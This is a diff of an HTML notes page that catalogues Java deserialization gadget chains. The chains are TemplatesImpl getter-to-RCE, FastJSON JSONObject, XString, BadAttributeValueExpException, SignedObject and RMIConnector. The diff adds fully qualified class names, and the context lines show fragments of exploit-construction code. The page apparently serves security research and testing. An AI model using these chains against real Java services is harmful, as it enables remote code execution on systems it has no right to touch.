@@ -1460,6 +1460,7 @@
 <h1 id="java-serialization-chains">Java Serialization Chains</h1>
 <h2 id="getter2rce">getter2RCE</h2>
 <h3 id="jdktemplatesimplgetoutputproperties">(JDK)TemplatesImpl#getOutputProperties</h3>
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p>
 <div class="highlight"><pre><span></span><code><span class="c1">// getter2RCE</span>
 <span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span>
 <span class="n">ClassPool</span><span class="w"> </span><span class="n">classPool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span>
@@ -1485,12 +1486,14 @@
 </code></pre></div>
 <h2 id="tostring2getter">toString2getter</h2>
 <h3 id="fastjsonjsonobject">(FastJSON)JSONObject</h3>
+<p><code>com.alibaba.fastjson.JSONObject</code></p>
 <div class="highlight"><pre><span></span><code><span class="c1">// templates.getXXX()</span>
 <span class="n">JSONObject</span><span class="w"> </span><span class="n">jo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JSONObject</span><span class="p">();</span>
 <span class="n">jo</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;oops&quot;</span><span class="p">,</span><span class="n">templates</span><span class="p">);</span>
 </code></pre></div>
 <h2 id="readobject2tostring">readObject2toString</h2>
 <h3 id="jdkxstring">(JDK)XString</h3>
+<p><code>com.sun.org.apache.xpath.internal.objects.XString</code></p>
 <div class="highlight"><pre><span></span><code><span class="n">XString</span><span class="w"> </span><span class="n">xString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">XString</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">);</span>
 <span class="n">HashMap</span><span class="w"> </span><span class="n">map1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span>
 <span class="n">HashMap</span><span class="w"> </span><span class="n">map2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span>
@@ -1524,8 +1527,10 @@
 <span class="w">    </span><span class="p">}</span>
 </code></pre></div>
 <h3 id="jdkbadattributevalueexpexception">(JDK)BadAttributeValueExpException</h3>
+<p><code>javax.management.BadAttributeValueExpException</code></p>
 <h2 id="_1">二次反序列化</h2>
 <h3 id="signedobject">SignedObject</h3>
+<p><code>java.security.SignedObject</code></p>
 <p>SignedObject#getObject -&gt; readObject</p>
 <div class="highlight"><pre><span></span><code><span class="w"> </span><span class="c1">// getObject2readObject</span>
 <span class="n">KeyPairGenerator</span><span class="w"> </span><span class="n">kpg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">KeyPairGenerator</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&quot;DSA&quot;</span><span class="p">);</span>
@@ -1534,6 +1539,7 @@
 <span class="n">SignedObject</span><span class="w"> </span><span class="n">signedObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SignedObject</span><span class="p">(</span><span class="n">yourObject</span><span class="p">,</span><span class="w"> </span><span class="n">kp</span><span class="p">.</span><span class="na">getPrivate</span><span class="p">(),</span><span class="w"> </span><span class="n">Signature</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&quot;DSA&quot;</span><span class="p">));</span>
 </code></pre></div>
 <h3 id="rmiconnector">RMIConnector</h3>
+<p><code>javax.management.remote.rmi.RMIConnector</code></p>
 <p>RMIConnector#connect -&gt; readObject</p>
 <div class="highlight"><pre><span></span><code><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">tser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span>
 <span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">toser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">tser</span><span class="p">);</span>
